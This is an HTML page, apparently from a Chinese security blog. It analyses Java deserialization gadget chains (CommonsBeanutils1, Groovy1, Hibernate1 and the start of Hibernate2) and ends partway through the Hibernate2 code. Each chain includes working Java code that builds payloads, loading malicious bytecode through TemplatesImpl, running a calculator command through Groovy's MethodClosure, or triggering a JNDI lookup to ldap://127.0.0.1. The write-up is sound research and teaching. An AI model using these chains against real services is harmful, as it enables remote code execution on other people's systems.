@@ -1,0 +1,1019 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java 反序列化漏洞（三） - CB/Groovy/Hibernate/Spring | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java 反序列化漏洞（三） - CB/Groovy/Hibernate/Spring
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-06-21
+              </span>
+              <span>
+                28 min read
+              </span>
+              
+                <a href="https://su18.org/tag/YWv10I0qb/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://su18.org/tag/J9zfIgD5go/" class="post-tag">
+                  # java
+                </a>
+              
+                <a href="https://su18.org/tag/TjYa_DdRZS/" class="post-tag">
+                  # 渗透测试
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+                <a href="https://su18.org/tag/bbwakgnJvv/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/ysoserial-su18-3.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="commonsbeanutils1">CommonsBeanutils1</h1>
+<p>commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean 的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。</p>
+<p>其中比较常使用的有 MethodUtils/ConstructorUtils/PropertyUtils/BeanUtils/ConvertUtils<br>
+等。</p>
+<p>在之前的利用链中，有这样一条链：</p>
+<blockquote>
+<p>PriorityQueue -&gt; TransformingComparator -&gt; ChainedTransformer -&gt; InstantiateTransformer -&gt; TemplatesImpl</p>
+</blockquote>
+<p>在反序列化链中，由 TransformingComparator 触发 ChainedTransformer 来实例化 TemplatesImpl，那能不能找到一个 Comparator，绕过中间复杂过程，直接实例化 TemplatesImpl 呢？</p>
+<p>于是有了 CommonsBeanutils 这条链。</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="propertyutils">PropertyUtils</h3>
+<p><code>org.apache.commons.beanutils.PropertyUtils</code> 类使用 Java 反射 API 来调用 Java 对象上的通用属性 getter 和 setter 操作的实用方法。这些方法的具体使用逻辑其实是由 <code>org.apache.commons.beanutils.PropertyUtilsBean</code> 来实现的。</p>
+<p>这个类有个共有静态方法 <code>getProperty()</code> ，接收两个参数 bean （类对象）和 name（属性名），方法会返回这个类的这个属性的值。</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1627008381367.png" alt="" loading="lazy"></figure>
+<p>类似于一个 Field 的反射工具类，不过不是直接使用反射取值，而是使用反射调用其 getter 方法取值。</p>
+<p>那么既然可以触发 getter，那就可以像 fastjson 一样来触发 TemplatesImpl 的 getOutputProperties 方法，触发后续的调用链。</p>
+<h3 id="beancomparator">BeanComparator</h3>
+<p>BeanComparator 是 commons-beanutils 提供的用来比较两个 JavaBean 是否相等的类，其实现了<code>java.util.Comparator</code> 接口。</p>
+<p>BeanComparator 在初始化时可以指定 property 属性名称和 comparator 对比器，如果不指定，则默认是 ComparableComparator 。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1627010870144.png" alt="" loading="lazy"></figure>
+<p>BeanComparator 的 compare 方法接收两个对象，分别调用 <code>PropertyUtils.getProperty()</code> 方法获取两个对象的 property 属性的值，然后调用 <code>internalCompare()</code> 方法调用实例化时初始化的 comparator 的 compare 方法进行比较。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1627010551676.png" alt="" loading="lazy"></figure>
+<p>有了这个方法，就构造了完整的调用链。</p>
+<h2 id="攻击构造">攻击构造</h2>
+<p>最终的攻击代码为：</p>
+<pre><code class="language-java">public class CommonBeanUtils {
+
+	public static String fileName = &quot;CommonBeanUtils.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 读取恶意类 bytes[]
+		InputStream inputStream = CommonBeanUtils.class.getResourceAsStream(&quot;EvilClassForCB.class&quot;);
+		byte[]      bytes       = new byte[inputStream.available()];
+		inputStream.read(bytes);
+
+		// 初始化 PriorityQueue
+		PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+		queue.add(&quot;1&quot;);
+		queue.add(&quot;2&quot;);
+
+		// 初始化 TemplatesImpl 对象
+		TemplatesImpl tmpl      = new TemplatesImpl();
+		Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+		bytecodes.setAccessible(true);
+		bytecodes.set(tmpl, new byte[][]{bytes});
+		// _name 不能为空
+		Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+		name.setAccessible(true);
+		name.set(tmpl, &quot;su18&quot;);
+
+		// 反射将 TemplatesImpl 放在 PriorityQueue 里
+		Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+		field.setAccessible(true);
+		Object[] objects = (Object[]) field.get(queue);
+		objects[0] = tmpl;
+
+		// 初始化 BeanComparator
+		BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
+
+		// 反射将 BeanComparator 写入 PriorityQueue 中
+		Field field2 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+		field2.setAccessible(true);
+		field2.set(queue, beanComparator);
+
+		SerializeUtil.writeObjectToFile(queue, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+}
+</code></pre>
+<p>以上代码可成功构造反序列化利用，但是有一个问题是，由于 BeanComparator 的默认 comparator 是 ComparableComparator ，这是个 CommonCollections 中的类，导致了这明明是一条 CB 的触发链，却要同时依赖 CC。增加了很多利用的限制，那该如何逃出 CC 的依赖呢？</p>
+<p>答案在实例化 BeanComparator 时赋予其一个 JDK 自带的并且实现了 Serializable 接口的 comparator 即可，比如 <code>java.util.Collections$ReverseComparator</code> 和 <code>java.lang.String$CaseInsensitiveComparator</code> 等。</p>
+<p>通过反射实例化 Comparator ，并在 BeanComparator 初始化时进行指定即可：</p>
+<pre><code>// 初始化 String$CaseInsensitiveComparator
+Class       c           = Class.forName(&quot;java.lang.String$CaseInsensitiveComparator&quot;);
+Constructor constructor = c.getDeclaredConstructor();
+constructor.setAccessible(true);
+Comparator comparator = (Comparator&lt;?&gt;) constructor.newInstance();
+
+// 初始化 BeanComparator
+BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, comparator);
+</code></pre>
+<p>这样就可以无需 CC 的依赖触发 CB 链了。</p>
+<h2 id="总结">总结</h2>
+<p>以上就是 CB 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>PriorityQueue 反序列化时调用 BeanComparator 的 compare，利用这个方法发射调用 TemplatesImpl 的 getOutputProperties 方法触发恶意类的实例化。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</code></li>
+<li>chain gadget：<code>org.apache.commons.beanutils.BeanComparator#compare()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PriorityQueue.readObject()
+    BeanComparator.compare()
+            PropertyUtils.getProperty()
+                PropertyUtilsBean.getProperty()
+                    TemplatesImpl.getOutputProperties()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-beanutils : 1.9.2<br>
+commons-collections : 2.0-3.2.2<br>
+commons-loggings : 1.2</p>
+</blockquote>
+<h1 id="groovy1">Groovy1</h1>
+<p>Groovy 是一种基于 JVM 的开发语言，具有类似于 Python，Ruby，Perl 和 Smalltalk 的功能。Groovy 既可以用作 Java 平台的编程语言，也可以用作脚本语言。groovy 编译之后生成 .class 文件，与 Java 编译生成的无异，因此可以在 JVM 上运行。</p>
+<p>在项目中可以引用 Groovy 的相关包依赖，分为核心包和模块包，如果想依赖全部包，可以使用 groovy-all。本条利用 Gadget 就是在 groovy 核心包中。</p>
+<h2 id="前置知识-2">前置知识</h2>
+<h3 id="methodclosure">MethodClosure</h3>
+<p><code>org.codehaus.groovy.runtime.MethodClosure</code> 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。</p>
+<p>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1627097949300.png" alt="" loading="lazy"></figure>
+<p>MethodClosure 中有一个 doCall 方法，调用 <code>InvokerHelper.invokeMethod()</code> 方法进行方法调用。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1627098008278.png" alt="" loading="lazy"></figure>
+<p>这样就可以使用 MethodClosure 执行系统命令：</p>
+<pre><code class="language-java">MethodClosure mc = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);
+Method        m  = MethodClosure.class.getDeclaredMethod(&quot;doCall&quot;, Object.class);
+m.setAccessible(true);
+m.invoke(mc, &quot;open -a Calculator.app&quot;);
+</code></pre>
+<h3 id="stringexecute-方法">String.execute() 方法</h3>
+<p>Groovy 为 String 类型添加了 <code>execute()</code> 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 <code>&quot;ls&quot;.execute()</code> 这种方法来执行系统命令 “ls”。</p>
+<p>写法非常简单，例如：</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1627264563078.png" alt="" loading="lazy"></figure>
+<p>实际上就是调用  <code>Runtime.getRuntime().exec()</code> 方法执行系统命令：</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1627264510483.png" alt="" loading="lazy"></figure>
+<p>在 Java 中，就可以直接写做：</p>
+<pre><code class="language-java">MethodClosure methodClosure = new MethodClosure(&quot;open -a Calculator.app&quot;, &quot;execute&quot;);
+methodClosure.call();
+</code></pre>
+<h3 id="convertedclosure">ConvertedClosure</h3>
+<p><code>org.codehaus.groovy.runtime.ConvertedClosure</code> 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。</p>
+<p>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 <code>invoke</code> 方法，除了 toString 和一些默认方法外，会调用 <code>invokeCustom</code> 方法。</p>
+<p>如果初始化时指定的 method 与 <code>invokeCustom</code> 指定的 method 参数相同，则 <code>invokeCustom</code>  方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1627265476782.png" alt="" loading="lazy"></figure>
+<p>看到这里就明白这条链的触发逻辑了。后面自然是使用 AnnotationInvocationHandler 将 ConvertedClosure 代理成 Map 类。这样在反序列化</p>
+<h2 id="攻击构造-2">攻击构造</h2>
+<p>最终的恶意代码为：</p>
+<pre><code class="language-java">public class Groovy {
+
+	public static String fileName = &quot;Groovy.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		//封装我们需要执行的对象
+		MethodClosure    methodClosure = new MethodClosure(&quot;open -a Calculator.app&quot;, &quot;execute&quot;);
+		ConvertedClosure closure       = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);
+
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		// 创建 ConvertedClosure 的动态代理类实例
+		Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
+				new Class[]{Map.class}, closure);
+
+		// 使用动态代理初始化 AnnotationInvocationHandler
+		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);
+
+		SerializeUtil.writeObjectToFile(invocationHandler, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+}
+</code></pre>
+<p>这条链是非常优雅非常漂亮的一条调用链，需要对动态代理和 Groovy 相关技术的细节了解十分到位。</p>
+<h2 id="总结-2">总结</h2>
+<p>以上就是 Groovy 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>AnnotationInvocationHandler 反序列化时调用 memberValues 中存放对象的 entrySet 对象，这个对象是 ConvertedClosure，而这个对象又实际上是 MethodClosure 对象的代理，定义了在调用 entrySet 方法时会调用 invoke 方法去调用 MethodClosure 的 call 方法，触发 Groovy 中 String 类型的 execute 方法执行命令。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code></li>
+<li>sink gadget：<code>org.codehaus.groovy.runtime.MethodClosure#doCall()</code></li>
+<li>chain gadget：<code>org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>AnnotationInvocationHandler.readObject()
+    Map.entrySet() (Proxy)
+        ConversionHandler.invoke()
+            ConvertedClosure.invokeCustom()
+		        MethodClosure.call()
+                    ProcessGroovyMethods.execute()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>Groovy : 1.7.0-2.4.3</p>
+</blockquote>
+<h1 id="hibernate1">Hibernate1</h1>
+<p>Hibernate 是开源的一个 ORM 框架，用户量极其庞大，Hibernate1 依旧是利用 TemplatesImpl 这个类，找寻 <code>_outputProperties</code> 的 getter 方法的调用链。</p>
+<h2 id="前置知识-3">前置知识</h2>
+<h3 id="basicpropertyaccessor">BasicPropertyAccessor</h3>
+<p>在 hibernate 中定义了一个接口 <code>org.hibernate.property.PropertyAccessor</code>，定义了获取一个类的属性值的相关策略。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1627281169887.png" alt="" loading="lazy"></figure>
+<p>接口中有两个方法，分别是 <code>getGetter()</code> 和 <code>getSetter()</code>，接收 Class 对象和属性名，返回 <code>org.hibernate.property.Getter</code> 和 <code>org.hibernate.property.Setter</code> 对象。</p>
+<p>而 <code>org.hibernate.property.BasicPropertyAccessor</code> 是对 PropertyAccessor 的标准实现，在这个类中，首先定义了 BasicGetter 和 BasicSetter 两个实现类，重点关注 BasicGetter 类。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1627281674860.png" alt="" loading="lazy"></figure>
+<p>BasicGetter 类实例化时接收 3 个参数，分别是 Class 对象，Method 方法和属性名 propertyName。BasicGetter 的 <code>get</code> 方法接收一个对象实例，并调用 <code>method.invoke()</code> 方法反射调用这个 Method 方法。</p>
+<p>接下来回到 BasicPropertyAccessor，类的 <code>getGetter</code> 方法调用 <code>createGetter</code> 方法又调用 <code>getGetterOrNull</code> 方法来创建 BasicSetter，其中有一个重要的方法 <code>getterMethod</code>，这个方法通过指定的 Class 类以及 propertyName 属性名来查找在这个类中这个属性的 Getter Method。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1627284185268.png" alt="" loading="lazy"></figure>
+<p>可以看到这个方法的逻辑是这样的：</p>
+<ul>
+<li>调用 Class 的 <code>getDeclaredMethods</code> 方法获取全部方法</li>
+<li>Getter 方法不应该有参数，如果 Method 的参数类型数量不等于0，则跳过</li>
+<li>如果方法类型是 BRIDGE，则跳过</li>
+<li>获取方法名，如果以 get 或 is 开头，则可能为 getter 方法，sub 掉前缀后进行字符串的对比，在 <code>Introspector.decapitalize()</code> 方法中还进行的首字母大小写的处理。</li>
+</ul>
+<p>介绍到这里其实就可以了，这个类非常非常好理解，总结来说就是 BasicPropertyAccessor 的 <code>getGetter</code> 方法由类 Class 和属性名返回 BasicGetter 对象，调用这个对象的 <code>get</code> 方法传入类实例即可调用其满足条件的 getter 方法。</p>
+<p>这种情况下就可以使用这个类来触发 TemplatesImpl 的恶意调用了，示例代码如下：</p>
+<pre><code class="language-java">TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+BasicPropertyAccessor bpa    = new BasicPropertyAccessor();
+Getter   getter = bpa.getGetter(TemplatesImpl.class, &quot;outputProperties&quot;);
+getter.get(tmpl);
+</code></pre>
+<p>我这里为了方便理解用了 BasicPropertyAccessor ，实际上也可以直接反射调用 <code>BasicPropertyAccessor$BasicGetter</code> 的相关方法。</p>
+<h3 id="abstractcomponenttuplizer">AbstractComponentTuplizer</h3>
+<p>有了上面的发现，接下来我们要找在哪里可以调用 Getter 呢？</p>
+<p>抽象类 <code>org.hibernate.tuple.component.AbstractComponentTuplizer</code> 中定义了成员变量 getters，并可以通过 <code>getPropertyValues()</code> 方法进行调用。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1627300181103.png" alt="" loading="lazy"></figure>
+<p>但是抽象类我们无法调用，只能使用它的子类，AbstractComponentTuplizer 有两个子类，一个是 PojoComponentTuplizer，一个是 DynamicMapComponentTuplizer，这对应着 Hibernate 的实体对象的类型，即 pojo 和 dynamic-map。pojo 代表将 Hibernate 类型映射为 Java 实体类，而 dynamic-map 将映射为 Map 对象。</p>
+<p>这里选择 PojoComponentTuplizer 类，他的 <code>getPropertyValues()</code> 方法会调用其父类的此方法。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1627300358490.png" alt="" loading="lazy"></figure>
+<p>那么这个方法又在哪被调用了呢？我们借助 Idea 的查找功能发现调用点并不多，其中一个是 <code>ComponentType#getPropertyValue</code> 方法调用。</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1627300899051.png" alt="" loading="lazy"></figure>
+<p>这个方法是干什么的呢？请看下一节。</p>
+<h3 id="typedvalue">TypedValue</h3>
+<p><code>org.hibernate.engine.spi.TypedValue</code> 类是一个 final class，用来映射一个 Object 的值和对应的 Hibernate type。</p>
+<p>Hibernate 中定义了一个自己的类型接口 <code>org.hibernate.type.Hibernate.Type</code>，用来定义 Java 类型和一个或多个 JDBC 类型之间的映射。针对不同的类型有不同的实现类，开发人员也可以自己实现这个接口来自定义类型。</p>
+<p>而 TypedValue 就同时储存一个 Type 和 Object 的映射。上一部分最后提到的 ComponentType 就是 Type 的实现类。</p>
+<p>TypedValue 初始化时，除了赋值 type、value 操作外，还调用了 <code>initTransients</code> 方法对 hashcode 属性进行了初始化。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1627301298571.png" alt="" loading="lazy"></figure>
+<p>初始化时新创建了一个 ValueHolder 对象，并为其赋予了一个新的 DeferredInitializer 对象并重写了 <code>initialize()</code> 方法，这个方法是本条 gadget 的关键。</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1627301474603.png" alt="" loading="lazy"></figure>
+<p>由于对反序列化触发点的敏感性，我们首先发现 TypedValue 的 <code>hashCode()</code> 方法调用了成员变量 <code>hashcode.getValue()</code> 方法，这个方法又会调用 DeferredInitializer 的 <code>initialize()</code> 方法，就是之前我们初始化的那个。</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1627302011655.png" alt="" loading="lazy"></figure>
+<p>在重写的 <code>initialize()</code> 方法里调用了 type 的 <code>getHashCode()</code> 方法，并将 value 传入。那此时如果这个 Type 类型为 ComponentType，则会调用其 getHashCode 方法：</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1627302255582.png" alt="" loading="lazy"></figure>
+<p>在这里调用了 <code>getPropertyValue</code> 方法完成了调用链的构造。而 TypedValue  的 hashCode 方法使用 HashMap 触发即可 。</p>
+<h3 id="gettermethodimpl">GetterMethodImpl</h3>
+<p>在 Hibernate1 5.x 里，实现了 <code>org.hibernate.property.access.spi.GetterMethodImpl</code> 类，这个类能够替代 <code>BasicPropertyAccessor$BasicGetter.get()</code> 来调用 getter 方法。</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1627349389553.png" alt="" loading="lazy"></figure>
+<p>这个类初始化时直接接收一个 Method，而 get 方法直接调用，可以用来执行任意方法。</p>
+<h2 id="攻击构造-3">攻击构造</h2>
+<p>不得不说，Hibernate1 这条链的构造很长，也十分复杂，由于本人对 Hibernate 的使用不多，相关类的实际意义了解不足，所以在此仅仅是对 Gadget 链的构造进行了分析和拆解。综合以上的知识点，构造出来的恶意代码为：</p>
+<pre><code class="language-java">public class Hibernate1 {
+
+	public static String fileName = &quot;Hibernate1.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		Class&lt;?&gt; componentTypeClass             = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+		Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+		Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl   = SerializeUtil.generateTemplatesImpl();
+		Method        method = TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;);
+
+		Object getter;
+		try {
+			// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+			Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+			Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
+			constructor.setAccessible(true);
+			getter = constructor.newInstance(null, null, method);
+		} catch (Exception ignored) {
+			// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+			Class&lt;?&gt;       basicGetter = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);
+			Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
+			constructor.setAccessible(true);
+			getter = constructor.newInstance(tmpl.getClass(), method, &quot;outputProperties&quot;);
+		}
+
+		// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
+		Object tuplizer = SerializeUtil.createInstanceUnsafely(pojoComponentTuplizerClass);
+
+		// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
+		Field field = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);
+		field.setAccessible(true);
+		Object getters = Array.newInstance(getter.getClass(), 1);
+		Array.set(getters, 0, getter);
+		field.set(tuplizer, getters);
+
+		// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
+		Object type = SerializeUtil.createInstanceUnsafely(componentTypeClass);
+
+		// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
+		Field field1 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);
+		field1.setAccessible(true);
+		field1.set(type, tuplizer);
+
+		Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);
+		field2.setAccessible(true);
+		field2.set(type, 1);
+
+		Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);
+		field3.setAccessible(true);
+		field3.set(type, new Type[]{(Type) type});
+
+		// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
+		TypedValue typedValue = new TypedValue((Type) type, null);
+
+		// 创建反序列化用 HashMap
+		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+		hashMap.put(typedValue, &quot;su18&quot;);
+
+		// put 到 hashmap 之后再反射写入，防止 put 时触发
+		Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);
+		valueField.setAccessible(true);
+		valueField.set(typedValue, tmpl);
+
+		SerializeUtil.writeObjectToFile(hashMap, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>此时需要注意的是，在不同版本中，由于部分类的更新交替，利用的 Gadget 细节则不同。ysoserial 中也根据不同情况给出了需要修改的利用链：</p>
+<ul>
+<li>使用 <code>org.hibernate.property.access.spi.GetterMethodImpl</code> 替代 <code>org.hibernate.property.BasicPropertyAccessor$BasicGetter</code>。</li>
+<li>使用 <code>org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping</code> 来对 PojoComponentTuplizer 进行封装。</li>
+</ul>
+<p>由于 3.x 版本过于老旧，具体实现方式这里不进行实现，道理都是一致的。</p>
+<h2 id="总结-3">总结</h2>
+<p>以上就是 Hibernate1 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>由 HashMap 的反序列化触发 TypedValue 的 <code>hashCode</code>，调用到 ComponentType 的 <code>getHashCode</code> 方法，调用 PojoComponentTuplizer 的 <code>getPropertyValue</code> 的方法，然后使用 <code>BasicPropertyAccessor$BasicGetter</code> 调用 <code>get</code> 方法，触发 TemplatesImpl 的 <code>getOutputProperties</code> 方法。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</code></li>
+<li>chain gadget：<code>org.hibernate.tuple.component.PojoComponentTuplizer#getPropertyValues()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashMap.readObject()
+    TypedValue.hashCode()
+        ValueHolder.getValue()
+            ValueHolder.DeferredInitializer().initialize()
+                ComponentType.getHashCode()
+		            PojoComponentTuplizer.getPropertyValue()
+                        AbstractComponentTuplizer.getPropertyValue()
+                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()
+                                TemplatesImpl.getOutputProperties()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>Hibernate : 3-5</p>
+</blockquote>
+<h1 id="hibernate2">Hibernate2</h1>
+<p>既然是触发 getter 方法，这就让我们想到了 fastjson 的经典触发方式，除了 TemplatesImpl 实例化恶意类字节码，还有 JdbcRowSetImpl 触发恶意 JNDI 查询，Hibernate2 就是这种方式，不知道这两个漏洞是谁先出的，谁借鉴的谁。</p>
+<p>在 fastjson 中使用 JdbcRowSetImpl 的 <code>setAutoCommit</code>（setter）方法触发 JNDI 查询，而在 Hibernate2 中由于是触发 getter 方法，因此我们选择 <code>getDatabaseMetaData</code>。</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1627353949746.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造-4">攻击构造</h2>
+<p>JdbcRowSetImpl 这里也不再赘述了，直接上代码：</p>
+<pre><code class="language-java">public class Hibernate2 {
+
+	public static String fileName = &quot;Hibernate2.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		Class&lt;?&gt; componentTypeClass             = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+		Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+		Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+
+
+		// 实例化 JdbcRowSetImpl 类
+		JdbcRowSetImpl rs = new JdbcRowSetImpl();
+		rs.setDataSourceName(&quot;ldap://127.0.0.1:23457/Command8&quot;);
+		Method method = JdbcRowSetImpl.class.getDeclaredMethod(&quot;getDatabaseMetaData&quot;);
+
+		Object getter;
+		try {
+			// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
